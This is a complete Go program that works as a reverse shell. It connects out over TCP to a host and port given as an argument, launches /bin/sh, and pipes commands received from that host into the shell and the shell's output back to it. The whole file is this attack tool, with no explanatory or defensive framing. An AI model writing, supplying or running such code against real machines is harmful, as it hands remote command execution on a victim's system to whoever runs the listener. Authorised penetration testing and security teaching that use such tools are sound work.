package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

func main() {
	if len(os.Args[1:]) < 1 {
		fmt.Println("Usage:", os.Args[0], "<host:port>")
		os.Exit(1)
	}

	target := os.Args[1]

	conn, err := net.Dial("tcp", target)
	if err != nil {
		log.Fatal(fmt.Sprintf("Can't connect to %s: %s", target, err))
	}

	cmd := exec.Command("/bin/sh")

	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Fatal("Can't open STDIN pipe: ", err)
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Fatal("Can't open STDOUT pipe: ", err)
	}

	err = cmd.Start()
	if err != nil {
		log.Fatal("Can't start shell: ", err)
	}

	for {
		msg, err := bufio.NewReader(conn).ReadString('\n')

		if err != nil {
			log.Fatal("Can't read from socket: ", err)
		}

		_, err = stdin.Write([]byte(msg))
		if err != nil {
			log.Fatal("Can't write to STDIN: ", err)
		}

		out, err := bufio.NewReader(stdout).ReadString('\n')
		if err != nil {
			log.Fatal("Can't read from STDOUT: ", err)
		}

		_, err = conn.Write([]byte(out))
		if err != nil {
			log.Fatal("Can't write to target host: ", err)
		}
	}
}
